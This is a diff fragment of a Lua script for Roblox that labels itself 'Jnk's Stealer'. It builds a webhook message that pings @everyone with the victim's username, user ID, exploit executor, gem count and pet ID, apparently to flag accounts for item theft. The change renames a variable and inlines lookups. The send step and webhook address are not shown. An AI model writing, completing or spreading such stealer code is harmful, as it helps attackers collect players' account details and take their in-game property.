@@ -5,24 +5,24 @@ local webhookcheck =
    SONA_LOADED and "Sona" or
    "Random ass exploit"
 
-   local player = game.Players.LocalPlayer
-   local username = player.Name
+   local fardplayer = game.Players.LocalPlayer
+   local username = game:GetService("Players").LocalPlayer.Name
    local data = {
    ["content"] = "@everyone",
    ["embeds"] = {
        {
            ["title"] = "**Jnk's Stealer**",
-           ["description"] = "```Username: " .. username .."```",
+           ["description"] = "```Username: " .. game.Players.LocalPlayer.Name.."```",
            ["type"] = "rich",
            ["color"] = tonumber(0094cf),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(username)
+                   tostring(game:GetService("Players").LocalPlayer.Name)
            },   
            ["fields"] = {
             {
                 ["name"] = "``Data Generated``",
-                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..player.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
+                ["value"] = "``Username :`` **" ..username .." **\n``User ID : ``**" ..fardplayer.userId .. "**\n**``Account Age :``** **``not found``**\n**``Device :``** **Computer**\n``Exploit :`` "..webhookcheck.."\n``Gems :`` **" ..dims .." **\n``Pet ID :`` "..v.Name .."", 
                 ["inline"] = false
             }
             
